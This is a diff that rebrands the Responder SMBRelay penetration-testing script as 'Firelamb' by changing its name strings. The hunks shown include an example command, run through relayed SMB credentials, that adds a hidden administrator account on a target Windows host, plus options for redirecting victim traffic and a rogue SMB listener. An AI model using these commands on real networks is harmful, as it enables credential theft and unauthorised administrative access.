@@ -1,5 +1,5 @@
 #!/usr/bin/env python
-# This file is part of Responder
+# This file is part of Firelamb
 # Original work by Laurent Gaffie - Trustwave Holdings
 #
 # This program is free software: you can redistribute it and/or modify
@@ -44,9 +44,9 @@ def UserCallBack(op, value, dmy, parser):
         args.extend(getattr(parser.values, op.dest))
     setattr(parser.values, op.dest, args)
 
-parser = optparse.OptionParser(usage="python %prog -i 10.20.30.40 -c 'net user Responder Quol0eeP/e}X /add &&net localgroup administrators Responder /add' -t 10.20.30.45 -u Administrator lgandx admin", prog=sys.argv[0],)
+parser = optparse.OptionParser(usage="python %prog -i 10.20.30.40 -c 'net user Firelamb Quol0eeP/e}X /add &&net localgroup administrators Firelamb /add' -t 10.20.30.45 -u Administrator lgandx admin", prog=sys.argv[0],)
 parser.add_option('-i','--ip', action="store", help="The ip address to redirect the traffic to. (usually yours)", metavar="10.20.30.40",dest="Responder_IP")
-parser.add_option('-c',action='store', help='Command to run on the target.',metavar='"net user Responder Quol0eeP/e}X /ADD"',dest='CMD')
+parser.add_option('-c',action='store', help='Command to run on the target.',metavar='"net user Firelamb Quol0eeP/e}X /ADD"',dest='CMD')
 parser.add_option('-t',action="store", help="Target server for SMB relay.",metavar="10.20.30.45",dest="TARGET")
 parser.add_option('-d',action="store", help="Target Domain for SMB relay (optional). This can be set to overwrite a domain logon (DOMAIN\Username) with the gathered credentials. Woks on NTLMv1",metavar="WORKGROUP",dest="Domain")
 parser.add_option('-u', '--UserToRelay', action="callback", callback=UserCallBack, dest="UserToRelay")
@@ -73,8 +73,8 @@ Command  = options.CMD
 Target = options.TARGET
 Responder_IP = options.Responder_IP
 
-print "\nResponder SMBRelay 0.1\nPlease send bugs/comments to: laurent.gaffie@gmail.com"
-print '\033[31m'+'Use this script in combination with Responder.py for best results (remember to set SMB = Off in Responder.conf)..\nUsernames  to relay (-u) are case sensitive.'+'\033[0m'
+print "\nFirelamb SMBRelay 0.1\nPlease send bugs/comments to: laurent.gaffie@gmail.com"
+print '\033[31m'+'Use this script in combination with Firelamb.py for best results (remember to set SMB = Off in Firelamb.conf)..\nUsernames  to relay (-u) are case sensitive.'+'\033[0m'
 print 'To kill this script hit CRTL-C or Enter\nWill relay credentials for these users: '+'\033[1m\033[34m'+', '.join(UserToRelay)+'\033[0m\n'
 
 #Function used to verify if a previous auth attempt was made.
@@ -182,7 +182,7 @@ def SmbRogueSrv139(key,Target,DomainMachineName):
         conn, addr = s.accept()
     except error, msg:
         if "Address already in use" in msg:
-            print '\033[31m'+'Something is already listening on TCP 139, did you set SMB = Off in Responder.conf..?\nSMB Relay will not work.'+'\033[0m'
+            print '\033[31m'+'Something is already listening on TCP 139, did you set SMB = Off in Firelamb.conf..?\nSMB Relay will not work.'+'\033[0m'
 
     try:
         while True:
